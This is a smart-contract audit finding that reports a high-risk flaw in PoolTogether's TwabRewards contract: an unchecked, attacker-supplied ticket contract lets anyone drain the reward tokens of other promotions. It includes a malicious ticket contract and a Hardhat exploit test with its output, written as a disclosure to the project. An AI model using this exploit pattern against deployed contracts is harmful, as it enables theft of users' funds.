## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Malicious tickets can lead to the loss of all tokens](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/1) 

# Handle

johnnycash


# Vulnerability details

## Impact

It allows an attacker to retrieve all the tokens of each promotions.


## Analysis

Anyone can create a new promotion using `createPromotion()`. An attacker can create a new malicious promotion with the following parameters:

- the address of a malicious ticket smart contract
- the token address from the targeted promotion(s)
- optionally, `_numberOfEpochs` equal to 0 to create this promotion for free

The only verification made on the ticket address given by [_requireTicket()](https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the `ITicket` interface.

The attacker can then call `claimRewards()` with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.

1. `_calculateRewardAmount()` is first called to get the reward amount with the following formula `(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween()`. The malicious ticket can return an arbitrary  `_averageBalance` and an `_averageTotalSupplies` of 1, leading to an arbitrary large reward amount.
2. `_promotion.token.safeTransfer(_user, _rewardsAmount)` is called. It transfers the amount of tokens previously computed to the attacker.

The attacker receives the tokens of other promotions without having spent anything.


## Proof of Concept

The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol)with the following changes:

```
    /// @inheritdoc ITicket
    function getAverageTotalSuppliesBetween(
        uint64[] calldata _startTimes,
        uint64[] calldata _endTimes
    ) external view override returns (uint256[] memory) {
        uint256[] memory _balances = new uint256[](1);
        _balances[0] = uint256(1);
        return _balances;
    }

    /// @inheritdoc ITicket
    function getAverageBalanceBetween(
        address _user,
        uint64 _startTime,
        uint64 _endTime
    ) external view override returns (uint256) {
        return 1337;
    }
```

The test for HardHat is:

```
    describe('exploit()', async () => {
        it('this shouldnt happen', async () => {
            const promotionIdOne = 1;
            const promotionIdTwo = 2;

            await expect(createPromotion(ticket.address))
                .to.emit(twabRewards, 'PromotionCreated')
                .withArgs(promotionIdOne);
            
            let evilTicketFactory = await getContractFactory('EvilTicket');
            let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);
            let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
            await expect(twabRewards.connect(wallet2).createPromotion(
                evilTicket.address,
                rewardToken.address,
                tokensPerEpoch,
                createPromotionTimestamp,
                1,//epochDuration,
                0,//epochsNumber,
            )).to.emit(twabRewards, 'PromotionCreated')
              .withArgs(promotionIdTwo);

            await increaseTime(100);
            const epochIds = ['100'];
            await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);
        });
    });
```

It results in the following error:

```
 1) TwabRewards
       exploit()
         this shouldnt happen:
     Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'
      at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)
      at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)
      at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)
      at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)
      at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)
      at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
```


## Tools Used

Text editor.


## Recommended Mitigation Steps

Maybe add a whitelist of trusted tickets?

